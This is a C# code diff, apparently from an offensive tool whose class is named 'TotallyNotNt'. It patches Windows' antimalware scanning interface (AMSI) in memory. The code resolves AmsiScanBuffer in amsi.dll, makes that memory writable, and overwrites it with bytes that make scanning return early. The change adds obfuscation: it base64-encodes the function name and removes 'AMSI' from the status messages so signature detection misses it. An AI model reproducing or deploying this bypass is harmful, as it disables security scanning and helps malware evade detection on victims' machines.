@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Text;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
@@ -144,12 +145,15 @@ public class TotallyNotNt
     {
         try
         {
+				var fooBar = WinLibBase.LoadLibrary("am" + "si.dll");
+                IntPtr addr = WinLibBase.GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
+				
             if (BigBoy)
             {
-                Console.WriteLine("[+] Patching AM" + "SI ...");
+                Console.WriteLine("[+] Patching...");
 
                 uint someNumber = 0;
-                IntPtr addr = WinLibBase.GetProcAddress(WinLibBase.LoadLibrary("am" + "si.dll"), "Am" + "siSca" + "nBuffer");
+				
                 WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length, 0x40, out someNumber);
 
                 Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length);
@@ -158,10 +162,10 @@ public class TotallyNotNt
             }
             else
             {
-                Console.WriteLine("[+] Patching AM" + "SI ...");
+                Console.WriteLine("[+] Patching ...");
 
                 uint someNumber = 0;
-                IntPtr addr = WinLibBase.GetProcAddress(WinLibBase.LoadLibrary("am" + "si.dll"), "Am" + "siSca" + "nBuffer");
+              
                 WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length, 0x40, out someNumber);
 
                 Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length);
